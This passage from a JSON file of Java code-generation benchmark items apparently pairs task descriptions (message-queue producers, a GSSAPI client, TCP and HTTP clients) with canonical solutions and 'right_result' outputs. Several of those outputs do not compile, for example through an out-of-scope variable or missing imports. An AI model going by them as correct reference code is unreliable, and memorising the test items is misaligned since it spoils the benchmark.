break;\n            }\n        }\n    }\n\n    @Override\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.List;\nimport java.util.concurrent.*;\n\npublic class RMQAsyncSendProducer extends AbstractMQProducer {\n    private final String nsAddr;\n    private DefaultMQProducer producer;\n    private SendCallback sendCallback;\n    private final List<SendResult> successSendResult = new CopyOnWriteArrayList<>();\n    private final AtomicInteger exceptionMsgCount = new AtomicInteger(0);\n    private final int msgSize;\n    private final Logger logger = LoggerFactory.getLogger(RMQAsyncSendProducer.class);\n\n    public RMQAsyncSendProducer(String nsAddr, String topic) {\n        super(topic);\n        this.nsAddr = nsAddr;\n        this.msgSize = 10; // default message size if not specified\n    }\n\n    @Override\n    public void create() {\n        producer = new DefaultMQProducer(\"RMQ_ASYNC_SEND_PRODUCER_GROUP\");\n        producer.setNamesrvAddr(nsAddr);\n        sendCallback = new SendCallback() {\n            @Override\n            public void onSuccess(SendResult sendResult) {\n                successSendResult.add(sendResult);\n            }\n\n            @Override\n            public void onException(Throwable e) {\n                logger.error(\"Message send failed: \", e);\n                exceptionMsgCount.incrementAndGet();\n            }\n        };\n    }\n\n    @Override\n    public void start() {\n        try {\n            producer.start();\n        } catch (MQClientException | InterruptedException e) {\n            logger.error(\"Failed to start producer\", e);\n            throw new RuntimeException(e);\n        }\n    }\n\n    public void asyncSend(Object msg) {\n        Message rocketMsg = new Message(topic, msg.toString().getBytes());\n        producer.send(rocketMsg, sendCallback);\n    }\n\n    public void asyncSend(int msgSize) {\n        for (int i = 0; i < msgSize; i++) {\n            asyncSend(\"Test Message \" + i);\n        }\n    }\n\n    public void asyncSend(Object msg, MessageQueueSelector selector, Object arg) {\n        Message rocketMsg = new Message(topic, msg.toString().getBytes());\n        producer.send(rocketMsg, selector, arg, sendCallback);\n    }\n\n    public void waitForResponse(int timeoutMills) {\n        try {\n            Thread.sleep(timeoutMills);\n        } catch (InterruptedException e) {\n            logger.warn(\"Wait for response interrupted\", e);\n        }\n    }\n\n    @Override\n    public void shutdown() {\n        if (producer != null) {\n            producer.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 396,
    "Instruction": "Task Description: Create a Java class that implements an asynchronous message producer using RocketMQ, capable of sending messages to a specified topic with tags and keys, and handling success/failure callbacks.\n\nClass Description: AsyncProducer is a RocketMQ asynchronous message producer class that initializes a producer instance, sends messages asynchronously to a specified topic, and provides shutdown capability. It handles message sending callbacks for success and failure scenarios.\n\nAttributes:\nproducer: DefaultMQProducer - The RocketMQ producer instance responsible for sending messages\n\nMethods:\nAsyncProducer: [Constructor](String producerGroup, String namesrvAddr) -> void - Initializes the producer with a producer group name and NameServer address, sets retry policy for async sends, and starts the producer instance\nsendAsyncMessage: [Method](String topic, String tags, String keys, String body) -> void - Creates and sends an asynchronous message to the specified topic with given tags and keys, using the provided message body\nshutdown: [Method]() -> void - Shuts down the producer instance gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\nimport java.io.UnsupportedEncodingException;\n\npublic class AsyncProducer {\n\n    private DefaultMQProducer producer;\n\n    public AsyncProducer(String producerGroup, String namesrvAddr) throws MQClientException {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setRetryTimesWhenSendAsyncFailed(0);\n        producer.start();\n    }\n\n    public void sendAsyncMessage(String topic, String tags, String keys, String body) throws UnsupportedEncodingException {\n        Message msg = new Message(topic, \n                                tags, \n                                keys, \n                                body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        try {\n            producer.send(msg, new SendCallback() {\n                @Override\n                public void onSuccess(SendResult sendResult) {\n                    System.out.printf(\"OK %s %n\", sendResult.getMsgId());\n                }\n\n                @Override\n                public void onException(Throwable e) {\n                    System.out.printf(\"Exception %s %n\", e);\n                    e.printStackTrace();\n                }\n            });\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\n\npublic class AsyncProducer {\n    private final DefaultMQProducer producer;\n\n    public AsyncProducer(String producerGroup, String namesrvAddr) throws MQClientException {\n        this.producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setRetryTimesWhenSendAsyncFailed(3);\n        producer.start();\n    }\n\n    public void sendAsyncMessage(String topic, String tags, String keys, String body) {\n        Message msg = new Message(topic, tags.getBytes(), keys.getBytes(), body.getBytes());\n        producer.send(msg, new SendCallback() {\n            @Override\n            public void onSuccess(SendResult sendResult) {\n                System.out.println(\"Message sent successfully: \" + sendResult);\n            }\n\n            @Override\n            public void onException(Throwable throwable) {\n                System.err.println(\"Message sending failed: \" + throwable.getMessage());\n            }\n        });\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 398,
    "Instruction": "Task Description: Implement a Java class that establishes a secure TCP client connection using GSSAPI for authentication and secure message exchange with a server.\n\nClass Description: The GSSClient class provides functionality to connect to a server using TCP, establish a secure GSSAPI context, send encrypted messages, and verify received messages. It handles GSSAPI authentication and secure communication over a socket connection.\n\nAttributes:\n- s: Socket - The socket used for TCP communication with the server\n\nMethods:\n- main(String[] args) -> void - Entry point that parses command line arguments, establishes connection, and manages the secure communication flow\n- createCtxt(String serverName, Oid mechOid) -> GSSContext - Creates and establishes a GSSAPI security context with the server\n- sendMsgToPeer(GSSContext aCtxt, String msg) -> void - Sends an encrypted message to the server using the established security context\n- verifyMsgFromPeer(GSSContext aCtxt, String msg) -> void - Verifies the message integrity code (MIC) received from the server\n- usage() -> void - Prints usage information for the program\n- print(String msg) -> void - Helper method to print messages to standard output\n- exit(int status) -> void - Closes the socket connection and exits the program with specified status code",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\n\nimport com.sun.gssapi.*;\n\nclass GSSClient {\n\n    private static Socket s;\n\n    public static void main(String args[]) {\n        String serverHost, serverName, message;\n        int port = 4444;\n\n        if (args.length < 3) {\n            usage();\n            exit(1);\n        }\n\n        serverHost = args[args.length - 3];\n        serverName = args[args.length - 2];\n        message = args[args.length - 1];\n        \n        try {\n            Oid mechOid = GSSManager.getDefaultMech();\n\n            for (int i = 0; i < (args.length - 3); i++) {\n                if (args[i].equals(\"-port\")) {\n                    if (i >= (args.length - 4)) {\n                        usage();\n                        exit(-1);\n                    }\n                    port = Integer.parseInt(args[++i]);\n                } else if (args[i].equals(\"-mech\")) {\n                    if (i >= (args.length-4)) {\n                        usage();\n                        exit(-1);\n                    }\n                    mechOid = new Oid(args[++i]);\n                }\n            }\n\n            s = new Socket(serverHost, port);\n            GSSContext aCtxt = createCtxt(serverName, mechOid);\n            sendMsgToPeer(aCtxt, message);                        \n            verifyMsgFromPeer(aCtxt, message);\n            aCtxt.dispose();\n            exit(0);\n\n        } catch (IOException e) {\n            print(\"\\n**Communication ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        } catch (GSSException e) {\n            print(\"\\n**GSSAPI ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        }\n    }\n\n    private static GSSContext createCtxt(String serverName, Oid mechOid)\n                    throws GSSException, IOException {\n        GSSContext aCtxt = new GSSContext(\n            new GSSName(serverName, GSSName.NT_HOSTBASED_SERVICE),\n                      mechOid, null, 0);\n\n        aCtxt.requestConf(true);\n        aCtxt.requestInteg(true);\n        aCtxt.requestMutualAuth(true);\n        aCtxt.requestReplayDet(true);\n        aCtxt.requestSequenceDet(true);\n        \n        DataInputStream dis = new DataInputStream(s.getInputStream());\n        DataOutputStream dos = new DataOutputStream(s.getOutputStream());\n\n        byte []inTok = new byte[0];\n        \n        do {\n            byte[] outTok = aCtxt.init(inTok, 0, inTok.length);\n            \n            if (outTok != null) {\n                dos.writeInt(outTok.length);\n                dos.write(outTok, 0, outTok.length);\n            }\n            \n            if (aCtxt.isEstablished())\n                break;\n            \n            inTok = new byte[dis.readInt()];\n            dis.readFully(inTok, 0, inTok.length);\n        } while (true);\n            \n        return (aCtxt);\n    }\n\n    private static void sendMsgToPeer(GSSContext aCtxt, String msg)\n                throws GSSException, IOException {\n        MessageProp mInfo = new MessageProp(0, true);\n        byte []tok = aCtxt.wrap(msg.getBytes(), 0, msg.length(), mInfo);\n        DataOutputStream dos = new DataOutputStream(s.getOutputStream());\n        dos.writeInt(tok.length);\n        dos.write(tok);\n        dos.flush();\n    }\n\n    private static void verifyMsgFromPeer(GSSContext aCtxt, String msg)\n                throws GSSException, IOException {\n        DataInputStream dis = new DataInputStream(s.getInputStream());\n        int len = dis.readInt();\n        MessageProp mInfo = new MessageProp();\n        aCtxt.verifyMIC(dis, new StringBufferInputStream(msg), mInfo);\n    }\n\n    private static void usage() {\n        print(\"GSSClient [-port port] [-mech 1.2.3.3] serverhost servername message\");\n    }\n\n    private static void print(String msg) {\n        System.out.println(msg);\n    }\n\n    private static void exit(int status) {\n        if (s != null) {\n            try {\n                s.close();\n            } catch (IOException e) {};\n        }\n        System.exit(status);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.security.PrivilegedAction;\nimport javax.security.auth.Subject;\nimport org.ietf.jgss.*;\n\npublic class GSSClient {\n    private Socket s;\n\n    public static void main(String[] args) throws Exception {\n        if (args.length < 2) {\n            new GSSClient().usage();\n            System.exit(1);\n        }\n\n        String serverName = args[0];\n        int port = Integer.parseInt(args[1]);\n        Oid mechOid = null;\n\n        try {\n            GSSManager manager = GSSManager.getInstance();\n            GSSContext context = null;\n            GSSClient client = new GSSClient();\n\n            client.s = new Socket(serverName, port);\n\n            InputStream inStream = client.s.getInputStream();\n            OutputStream outStream = client.s.getOutputStream();\n\n            context = client.createCtxt(serverName, mechOid);\n\n            byte[] token = new byte[0];\n            boolean isInitiator = true;\n\n            while (!context.isEstablished()) {\n                if (isInitiator) {\n                    token = context.initSecContext(token, 0, token.length);\n                    if (token != null) {\n                        outStream.write(token);\n                        outStream.flush();\n                    }\n                } else {\n                    token = context.acceptSecContext(token, 0, token.length);\n                }\n                isInitiator = false;\n            }\n\n            client.print(\"Security context established!\");\n\n            String message = \"Hello from client\";\n            client.sendMsgToPeer(context, message);\n\n            byte[] receivedToken = new byte[1024];\n            int bytesRead = inStream.read(receivedToken);\n            String receivedMessage = new String(receivedToken, 0, bytesRead);\n            client.verifyMsgFromPeer(context, receivedMessage);\n\n            context.dispose();\n            client.exit(0);\n        } catch (Exception e) {\n            e.printStackTrace();\n            client.exit(1);\n        }\n    }\n\n    protected GSSContext createCtxt(String serverName, Oid mechOid) throws GSSException {\n        GSSManager manager = GSSManager.getInstance();\n        Oid oid = (mechOid == null) ? manager.getMechanism(Oid.GSS_KRB5_MECH_OID).getOid() : mechOid;\n        GSSName targetName = manager.createName(serverName, GSSName.NT_HOSTBASED_SERVICE);\n        GSSContext context = manager.createContext(targetName, oid, null, GSSContext.DEFAULT_LIFETIME);\n        return context;\n    }\n\n    protected void sendMsgToPeer(GSSContext aCtxt, String msg) throws IOException, GSSException {\n        byte[] plainText = msg.getBytes();\n        byte[] outputToken = aCtxt.wrap(plainText, 0, plainText.length, GSSContext.DELIVERY_TIME_ONLY_FLAG);\n        OutputStream out = s.getOutputStream();\n        out.write(outputToken);\n        out.flush();\n    }\n\n    protected void verifyMsgFromPeer(GSSContext aCtxt, String msg) throws IOException, GSSException {\n        byte[] inputToken = msg.getBytes();\n        aCtxt.unwrap(inputToken, 0, inputToken.length);\n        print(\"Message verified successfully.\");\n    }\n\n    protected void usage() {\n        System.out.println(\"Usage: java GSSClient <server> <port>\");\n    }\n\n    protected void print(String msg) {\n        System.out.println(msg);\n    }\n\n    protected void exit(int status) {\n        try {\n            if (s != null && !s.isClosed()) {\n                s.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        System.exit(status);\n    }\n}\n```"
  },
  {
    "Task_id": 399,
    "Instruction": "Task Description: Create a TCP client class in Java that establishes a connection to a server, sends data to the server, and properly closes the connection.\n\nClass Description: The `TcpClient` class provides functionality to connect to a TCP server, send data to it, and manage the connection lifecycle. It encapsulates the socket and output stream for communication.\n\nAttributes:\n- socket: Socket - The socket object used for the TCP connection\n- out: OutputStream - The output stream for sending data to the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port\n- sendData(String data) -> void - Converts the input string to UTF-8 bytes and sends it to the server\n- close() -> void - Closes the output stream and socket connection",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class TcpClient {\n    private Socket socket;\n    private OutputStream out;\n\n    public void connect(String host, int port) throws IOException {\n        socket = new Socket(host, port);\n        out = socket.getOutputStream();\n    }\n\n    public void sendData(String data) throws IOException {\n        byte[] outputBytes = data.getBytes(\"UTF-8\");\n        out.write(outputBytes);\n        out.flush();\n    }\n\n    public void close() throws IOException {\n        if (out != null) {\n            out.close();\n        }\n        if (socket != null) {\n            socket.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class TcpClient {\n    private Socket socket;\n    private OutputStream out;\n\n    public void connect(String host, int port) throws Exception {\n        socket = new Socket(host, port);\n        out = socket.getOutputStream();\n    }\n\n    public void sendData(String data) throws Exception {\n        byte[] dataBytes = data.getBytes(\"UTF-8\");\n        out.write(dataBytes);\n        out.flush();\n    }\n\n    public void close() throws Exception {\n        if (out != null) {\n            out.close();\n        }\n        if (socket != null) {\n            socket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 4,
    "Instruction": "Task Description: Create a Java class that implements an ActiveMQ message producer capable of sending messages to both queues and topics.\n\nClass Description: The JmsProducer class is responsible for establishing a connection to an ActiveMQ broker, creating both queue and topic destinations, and sending multiple text messages to each destination. It handles connection management and includes error handling for JMS operations.\n\nAttributes:\n- USERNAME: [String] - Default username for ActiveMQ connection (default: ActiveMQConnection.DEFAULT_USER)\n- PASSWORD: [String] - Default password for ActiveMQ connection (default: ActiveMQConnection.DEFAULT_PASSWORD)\n- BROKEURL: [String] - Default broker URL for ActiveMQ connection (default: ActiveMQConnection.DEFAULT_BROKER_URL)\n- SENDNUM: [int] - Number of messages to send to each destination (default: 10)\n\nMethods:\n- run(): [void] - Main method that establishes the connection, creates destinations (queue and topic), and initiates message sending. Handles connection lifecycle and error cases.\n- sendMessage(Session session, MessageProducer messageProducer, String type): [void] - Helper method that creates and sends multiple text messages with timestamps to the specified destination. \n  Parameters:\n    - session: [Session] - JMS session for message creation\n    - messageProducer: [MessageProducer] - Producer for sending messages\n    - type: [String] - Destination type identifier (\"QUEUE\" or \"TOPIC\") for logging purposes",
    "Canonical_solution": "import javax.jms.Connection;\nimport javax.jms.ConnectionFactory;\nimport javax.jms.Destination;\nimport javax.jms.JMSException;\nimport javax.jms.MessageProducer;\nimport javax.jms.Session;\nimport javax.jms.TextMessage;\nimport org.apache.activemq.ActiveMQConnection;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class JmsProducer {\n\n    private static final String USERNAME = ActiveMQConnection.DEFAULT_USER;\n    private static final String PASSWORD = ActiveMQConnection.DEFAULT_PASSWORD;\n    private static final String BROKEURL = ActiveMQConnection.DEFAULT_BROKER_URL;\n    private static final int SENDNUM = 10;\n\n    public static void run() {\n        ConnectionFactory connectionFactory;\n        Connection connection = null;\n        Session session;\n        Destination destination;\n        MessageProducer messageProducer;\n        \n        connectionFactory = new ActiveMQConnectionFactory(JmsProducer.USERNAME, JmsProducer.PASSWORD, JmsProducer.BROKEURL);\n        try {\n            connection = connectionFactory.createConnection();\n            connection.start();\n            session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);\n            destination = session.createQueue(\"SAMPLE_MQ_QUEUE\");\n            messageProducer = session.createProducer(destination);\n            sendMessage(session, messageProducer, \"QUEUE\");\n\n            destination = session.createTopic(\"SAMPLE_MQ_TOPIC\");\n            messageProducer = session.createProducer(destination);\n            sendMessage(session, messageProducer, \"TOPIC\");\n            session.commit();\n            Thread.sleep(1000);\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (connection != null) {\n                try {\n                    connection.close();\n                } catch (JMSException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public static void sendMessage(Session session, MessageProducer messageProducer, String type) throws Exception {\n        for (int i = 0; i < JmsProducer.SENDNUM; i++) {\n            Date date = new Date();\n            TextMessage message = session.createTextMessage(\"ActiveMQ \u53d1\u9001\u6d88\u606f\u65f6\u95f4\uff1a\" + date);\n            System.out.println(\"\\t\" + type + \"\\t\u53d1\u9001\u6d88\u606f\uff1aActivemq \u53d1\u9001\u6d88\u606f\u65f6\u95f4\uff1a\" + date);\n            messageProducer.send(message);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 38,
    "right_result": "```java\nimport org.apache.activemq.ActiveMQConnection;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\nimport javax.jms.*;\nimport java.util.Date;\n\npublic class JmsProducer {\n\n    private static final String USERNAME = ActiveMQConnection.DEFAULT_USER;\n    private static final String PASSWORD = ActiveMQConnection.DEFAULT_PASSWORD;\n    private static final String BROKER_URL = ActiveMQConnection.DEFAULT_BROKER_URL;\n    private static final int SEND_NUM = 10;\n\n    public void run() {\n        Connection connection = null;\n        Session session = null;\n        try {\n            ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(USERNAME, PASSWORD, BROKER_URL);\n            connection = connectionFactory.createConnection();\n            connection.start();\n\n            session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n\n            Destination queueDestination = session.createQueue(\"SampleQueue\");\n            MessageProducer queueProducer = session.createProducer(queueDestination);\n            sendMessage(session, queueProducer, \"QUEUE\");\n\n            Destination topicDestination = session.createTopic(\"SampleTopic\");\n            MessageProducer topicProducer = session.createProducer(topicDestination);\n            sendMessage(session, topicProducer, \"TOPIC\");\n\n        } catch (JMSException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (session != null) session.close();\n                if (connection != null) connection.close();\n            } catch (JMSException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void sendMessage(Session session, MessageProducer messageProducer, String type) throws JMSException {\n        for (int i = 0; i < SEND_NUM; i++) {\n            TextMessage message = session.createTextMessage(\"Message \" + i + \" sent at \" + new Date());\n            messageProducer.send(message);\n            System.out.println(\"[\" + type + \"] Sent: \" + message.getText());\n        }\n    }\n\n    public static void main(String[] args) {\n        JmsProducer jmsProducer = new JmsProducer();\n        jmsProducer.run();\n    }\n}\n```"
  },
  {
    "Task_id": 40,
    "Instruction": "Task Description: Create a Java class that facilitates HTTP communication using Java's HttpClient, supporting GET requests with configurable options and error handling.\n\nClass Description: The HttpCommunicator class provides functionality to send HTTP GET requests to specified URIs. It includes features like automatic redirect following and optional error suppression for non-critical requests. The class encapsulates the HttpClient instance and provides methods for request execution.\n\nAttributes:\nhttpClient: [HttpClient] - The underlying HttpClient instance used for all HTTP communications, configured to always follow redirects.\n\nMethods:\nsendGetRequest: [Name](String uri, Map<String, Object> attributes) -> String - Sends a GET request to the specified URI. The attributes map can contain optional parameters like \"optional-option\" to suppress exceptions for non-critical requests. Returns the response body as a string or empty string for optional failed requests.\n\nreadUri: [Name](URI uri, boolean optional) -> String - Internal method that constructs and executes the HTTP request. If optional is true, returns empty string on failure instead of throwing an exception.\n\nisHttpOrHttps: [Name](String url) -> boolean - Helper method to check if a URL string uses HTTP or HTTPS protocol. Returns true if the URL starts with \"http://\" or \"https://\".",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.Map;\n\npublic class HttpCommunicator {\n\n    private HttpClient httpClient;\n\n    public HttpCommunicator() {\n        this.httpClient = HttpClient.newBuilder()\n                .followRedirects(HttpClient.Redirect.ALWAYS)\n                .build();\n    }\n\n    public String sendGetRequest(String uri, Map<String, Object> attributes) {\n        boolean isOptional = attributes.containsKey(\"optional-option\");\n        return readUri(URI.create(uri), isOptional);\n    }\n\n    private String readUri(URI uri, boolean optional) {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(uri)\n                .GET()\n                .build();\n        try {\n            return httpClient.send(request, HttpResponse.BodyHandlers.ofString()).body();\n        } catch (Exception e) {\n            if (optional) {\n                return \"\";\n            } else {\n                throw new RuntimeException(e);\n            }\n        }\n    }\n\n    private boolean isHttpOrHttps(String url) {\n        return url != null && (url.startsWith(\"http://\") || url.startsWith(\"https://\"));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.Map;\n\npublic class HttpCommunicator {\n    private final HttpClient httpClient;\n\n    public HttpCommunicator() {\n        this.httpClient = HttpClient.newBuilder()\n                .followRedirects(HttpClient.Redirect.ALWAYS)\n                .build();\n    }\n\n    public String sendGetRequest(String uri, Map<String, Object> attributes) {\n        boolean optional = Boolean.TRUE.equals(attributes.get(\"optional-option\"));\n        try {\n            return readUri(new URI(uri), optional);\n        } catch (Exception e) {\n            if (optional) {\n                return \"\";\n            } else {\n                throw new RuntimeException(\"GET request failed for URI: \" + uri, e);\n            }\n        }\n    }\n\n    private String readUri(URI uri, boolean optional) throws IOException, InterruptedException {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(uri)\n                .GET()\n                .build();\n\n        try {\n            HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n            if (response.statusCode() >= 200 && response.statusCode() < 400) {\n                return response.body();\n            } else {\n                if (optional) {\n                    return \"\";\n                } else {\n                    throw new IOException(\"HTTP error code: \" + response.statusCode());\n                }\n            }\n        } catch (IOException | InterruptedException e) {\n            if (optional) {\n                return \"\";\n            } else {\n                throw e;\n            }\n        }\n    }\n\n    public boolean isHttpOrHttps(String url) {\n        return url != null && (url.startsWith(\"http://\") || url.startsWith(\"https://\"));\n    }\n}\n```"
  },
  {
    "Task_id": 400,
    "Instruction": "Task Description: Create a TCP client class in Java that establishes a connection to a server, allows sending messages to the server, and receives echoed responses until the termination command is sent.\n\nClass Description: The EchoClient class represents a TCP client that connects to a specified server host and port. It provides functionality for sending user input to the server and displaying the server's response, continuing this echo process until the user sends \"bye\" to terminate the connection.\n\nAttributes:\n- client: Socket - The socket used for the TCP connection to the server\n- input: BufferedReader - Reads user input from the console\n- buf: BufferedReader - Reads data from the server's response stream\n- out: PrintStream - Writes data to the server's output stream\n\nMethods:\n- EchoClient(String host, int port) -> void - Constructor that establishes a connection to the specified host and port, initializing the input/output streams\n- start() -> void - Starts the client interaction loop, reading user input and sending it to the server while displaying responses\n- close() -> void - Closes all open streams and the socket connection",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.net.Socket;\n\npublic class EchoClient {\n\n    private Socket client;\n    private BufferedReader input;\n    private BufferedReader buf;\n    private PrintStream out;\n\n    public EchoClient(String host, int port) throws Exception {\n        client = new Socket(host, port);\n        input = new BufferedReader(new InputStreamReader(System.in));\n        buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n        out = new PrintStream(client.getOutputStream());\n    }\n\n    public void start() throws Exception {\n        boolean flag = true;\n        while (flag) {\n            System.out.print(\"\u8f93\u5165\u4fe1\u606f\uff1a\");\n            String str = input.readLine();\n            out.println(str);\n            if (\"bye\".equals(str)) {\n                flag = false;\n            } else {\n                String echo = buf.readLine();\n                System.out.println(echo);\n            }\n        }\n        close();\n    }\n\n    public void close() throws Exception {\n        buf.close();\n        client.close();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class EchoClient {\n    private Socket client;\n    private BufferedReader input;\n    private BufferedReader buf;\n    private PrintStream out;\n\n    public EchoClient(String host, int port) {\n        try {\n            client = new Socket(host, port);\n            input = new BufferedReader(new InputStreamReader(System.in));\n            buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n            out = new PrintStream(client.getOutputStream());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        String userInput;\n        try {\n            while (true) {\n                System.out.print(\"Enter message: \");\n                userInput = input.readLine();\n                if (userInput.equalsIgnoreCase(\"bye\")) {\n                    break;\n                }\n                out.println(userInput);\n                String response = buf.readLine();\n                System.out.println(\"Server response: \" + response);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            close();\n        }\n    }\n\n    public void close() {\n        try {\n            if (input != null) input.close();\n            if (buf != null) buf.close();\n            if (out != null) out.close();\n            if (client != null && !client.isClosed()) client.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        if (args.length < 2) {\n            System.out.println(\"Usage: java EchoClient <host> <port>\");\n            return;\n        }\n        String host = args[0];\n        int port = Integer.parseInt(args[1]);\n        EchoClient client = new EchoClient(host, port);\n        client.start();\n    }\n}\n```"
  },
  {
    "Task_id": 401,
    "Instruction": "Task Description: Create a Java class that implements TCP client functionality for establishing a connection to a server, sending messages, and closing the connection.\n\nClass Description: The `SocketConnectTest` class provides basic TCP client capabilities using Java's Socket and I/O classes. It handles connection establishment, message transmission, and resource cleanup.\n\nAttributes:\n- client: [Socket] - The socket object representing the connection to the server\n- writer: [Writer] - The output stream writer for sending data to the server\n\nMethods:\n- connect: [connect(String host, int port)] -> [void] - Establishes a connection to the specified server host and port, initializing the socket and writer\n- sendMessage: [sendMessage(String message)] -> [void] - Sends the specified message to the connected server\n- close: [close()] -> [void] - Closes the writer and socket connection, releasing system resources",
    "Canonical_solution": "import java.io.*;\nimport java.net.Socket;\n\npublic class SocketConnectTest {\n\n    private Socket client;\n    private Writer writer;\n\n    public void connect(String host, int port) throws IOException {\n        client = new Socket(host, port);\n        writer = new OutputStreamWriter(client.getOutputStream());\n    }\n\n    public void sendMessage(String message) throws IOException {\n        writer.write(message);\n        writer.flush();\n    }\n\n    public void close() throws IOException {\n        writer.close();\n        client.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class SocketConnectTest {\n    private Socket client;\n    private Writer writer;\n\n    public void connect(String host, int port) throws IOException {\n        client = new Socket(host, port);\n        writer = new OutputStreamWriter(client.getOutputStream());\n    }\n\n    public void sendMessage(String message) throws IOException {\n        writer.write(message);\n        writer.flush();\n    }\n\n    public void close() throws IOException {\n        if (writer != null) {\n            writer.close();\n        }\n        if (client != null) {\n            client.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 408,
    "Instruction": "Task Description: Create a Java class that implements a TCP client for basic communication with a server using Java's IO and networking capabilities.\n\nClass Description: The HelloClient class establishes a TCP connection to a specified server, receives messages from the server, and properly closes the connection when done. It uses Java's Socket and BufferedReader for network communication.\n\nAttributes:\n- client: Socket - The socket object representing the connection to the server\n- buf: BufferedReader - The buffered reader for receiving data from the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port\n  - Input: \n    - host: String - The server hostname or IP address\n    - port: int - The server port number\n  - Throws: Exception - If connection fails\n- receive() -> String - Reads a line of text from the server\n  - Returns: String - The received message from the server\n  - Throws: Exception - If reading fails\n- close() -> void - Closes the connection and cleans up resources\n  - Throws: Exception - If closing fails",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.Socket;\n\npublic class HelloClient {\n\n    private Socket client;\n    private BufferedReader buf;\n\n    public void connect(String host, int port) throws Exception {\n        client = new Socket(host, port);\n        InputStreamReader inputStreamReader = new InputStreamReader(client.getInputStream());\n        buf = new BufferedReader(inputStreamReader);\n    }\n\n    public String receive() throws Exception {\n        String str = buf.readLine();\n        return str;\n    }\n\n    public void close() throws Exception {\n        buf.close();\n        client.close();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.Socket;\n\npublic class HelloClient {\n    private Socket client;\n    private BufferedReader buf;\n\n    public void connect(String host, int port) throws Exception {\n        client = new Socket(host, port);\n        buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n    }\n\n    public String receive() throws Exception {\n        return buf.readLine();\n    }\n\n    public void close() throws Exception {\n        if (buf != null) buf.close();\n        if (client != null) client.close();\n    }\n}\n```"
  },
  {
